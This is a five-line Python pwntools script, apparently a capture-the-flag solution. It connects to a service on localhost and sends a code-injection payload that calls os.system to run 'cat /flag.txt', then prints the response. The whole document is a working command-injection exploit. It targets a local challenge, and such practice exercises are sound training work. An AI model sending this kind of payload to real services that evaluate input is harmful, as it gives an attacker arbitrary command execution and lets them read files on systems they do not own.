from pwn import remote

r = remote('localhost',45612,level='error')
r.sendline("__import__('os').system('cat /flag.txt')")
print(r.recvline().decode())
